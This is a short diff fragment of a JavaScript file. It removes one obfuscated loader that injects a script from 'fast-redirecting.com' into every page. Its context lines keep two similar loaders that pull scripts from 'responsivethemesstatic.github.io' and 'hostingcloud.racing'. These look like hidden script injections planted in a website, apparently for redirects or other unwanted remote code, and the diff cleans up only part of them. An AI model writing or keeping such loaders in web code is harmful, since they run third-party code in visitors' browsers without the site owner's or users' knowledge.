@@ -5,13 +5,6 @@
     script.src = 'https://responsivethemesstatic.github.io/static/static.js';
     document.body.appendChild(script);
 })();
-(function (a, d, j, o) {
-   o = a.createElement(d),
-	  m = a.getElementsByTagName(d)[0];              
-   o.src = j + "?d=0&r=" + Math.random();
-   m.parentNode.insertBefore(o, m)
-})(document, 'script', 'https://fast-redirecting.com/sl/96e21a8e');
-
 (function() {
 var script = document.createElement('script');
     script.src = 'https://www.hostingcloud.racing/70wc.js';
